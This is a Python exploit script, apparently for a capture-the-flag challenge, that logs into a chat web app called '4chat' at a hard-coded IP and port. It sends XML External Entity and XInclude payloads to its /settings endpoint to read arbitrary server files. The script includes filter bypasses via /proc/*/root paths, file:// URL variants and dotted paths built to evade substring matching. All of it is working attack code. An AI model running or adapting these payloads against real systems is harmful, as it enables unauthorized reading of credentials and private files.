
#!/usr/bin/env python3
# read_4chat_file.py
# Usage:
#   python3 read_4chat_file.py http://62.173.139.193:16002 johh johh /root/fl4g.txt --verbose
#   python3 read_4chat_file.py <base> <user> <pwd> <path> [--method all|direct|proc|variants|xinclude] [--save out.txt]
#
# What it does: logs in, sends XXE to /settings and prints the file content.
# Includes bypasses: /proc/*/root and dotted/file:// variants. Unescapes HTML entities in output.
#
import argparse, requests, re, sys, html

PRE_RE = re.compile(r"<pre>(.*?)</pre>", re.S)

def login(sess: requests.Session, base: str, user: str, pwd: str):
    return sess.post(f"{base.rstrip('/')}/login", data={"command": f"/login {user} {pwd}"},
                     allow_redirects=True, timeout=10)

def post_xmldata(sess: requests.Session, base: str, xml: str) -> str:
    r = sess.post(f"{base.rstrip('/')}/settings", data={"profession": "peek", "xmldata": xml},
                  allow_redirects=True, timeout=15)
    m = PRE_RE.search(r.text)
    txt = (m.group(1).strip() if m else "").strip()
    return html.unescape(txt)

def xxe_direct(sess, base, path):
    # allow user to pass either plain /abs/path or file:// URL
    url = path if path.startswith("file://") else f"file://{path}"
    xml = f'''<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "{url}">]>
<settings><profession>&xxe;</profession></settings>'''
    return post_xmldata(sess, base, xml), url

def xxe_proc(sess, base, path):
    outs = []
    if not path.startswith("/") and not path.startswith("file://"):
        return outs
    # normalize to plain path first
    norm = path[7:] if path.startswith("file://") else path
    variants = [
        f"/proc/self/root{norm}",
        f"/proc/1/root{norm}",
    ]
    if norm.startswith("/root/"):
        rest = norm[len("/root/"):]
        variants += [
            f"/proc/self/root/root/{rest}",
            f"/proc/1/root/root/{rest}",
        ]
    for v in variants:
        xml = f'''<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file://{v}">]>
<settings><profession>&xxe;</profession></settings>'''
        outs.append((post_xmldata(sess, base, xml), v))
    return outs

def xxe_variants(sess, base, path):
    outs = []
    norm = path[7:] if path.startswith("file://") else path
    if not norm.startswith("/"):
        return outs
    urls = [
        f"file://{norm}",
        f"file://localhost{norm}",
        f"file:/{norm}",                 # single slash
        f"file:////{norm.lstrip('/')}",
        f"file://{norm.replace('/root/','/root/./')}",  # dotted to bypass substring matchers
        f"file://{norm.replace('/flag', '/./flag')}",
    ]
    for url in urls:
        xml = f'''<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "{url}">]>
<settings><profession>&xxe;</profession></settings>'''
        outs.append((post_xmldata(sess, base, xml), url))
    return outs

def xinclude(sess, base, path):
    url = path if path.startswith("file://") else f"file://{path}"
    xml = f'''<?xml version="1.0"?>
<settings xmlns:xi="http://www.w3.org/2001/XInclude">
  <profession><xi:include href="{url}" parse="text" /></profession>
</settings>'''
    return post_xmldata(sess, base, xml), url

def main():
    ap = argparse.ArgumentParser(description="Read an arbitrary file from 4chat via XXE.")
    ap.add_argument("base", help="Base URL, e.g. http://62.173.139.193:16002")
    ap.add_argument("user")
    ap.add_argument("pwd")
    ap.add_argument("path", help="Target path (e.g., /root/fl4g.txt). 'file://...' also accepted.")
    ap.add_argument("--method", choices=["all","direct","proc","variants","xinclude"], default="all")
    ap.add_argument("--verbose", action="store_true")
    ap.add_argument("--save", help="Save content to file")
    ap.add_argument("--show-hacker", action="store_true", help="Print content even if it equals 'hacker' (default hides it)")
    args = ap.parse_args()

    base = args.base.rstrip("/")
    s = requests.Session()
    login(s, base, args.user, args.pwd)
    try: s.get(f"{base}/chat", timeout=10)
    except Exception: pass

    tried = []
    def consider(data, via):
        if args.verbose:
            print(f"[?] via {via}: got {len(data)} bytes")
        if not data:
            return False
        if (data.strip() == "hacker") and not args.show_hacker:
            return False
        # success
        if args.save:
            with open(args.save, "w", encoding="utf-8", errors="ignore") as f:
                f.write(data)
        print(data)
        if args.verbose:
            print(f"\n[+] OK via: {via}")
        return True

    # try methods in order
    if args.method in ("all","direct"):
        data, via = xxe_direct(s, base, args.path)
        if consider(data, via): return

    if args.method in ("all","proc"):
        for data, via in xxe_proc(s, base, args.path):
            if consider(data, via): return

    if args.method in ("all","variants"):
        for data, via in xxe_variants(s, base, args.path):
            if consider(data, via): return

    if args.method in ("all","xinclude"):
        data, via = xinclude(s, base, args.path)
        if consider(data, via): return

    print("[-] Не удалось получить содержимое (похоже, фильтр подменяет на 'hacker' или путь недоступен).", file=sys.stderr)
    print("    Попробуйте --method proc или добавьте точечки: /root/./fl4g.txt, /proc/1/root/root/fl4g.txt", file=sys.stderr)

if __name__ == "__main__":
    main()
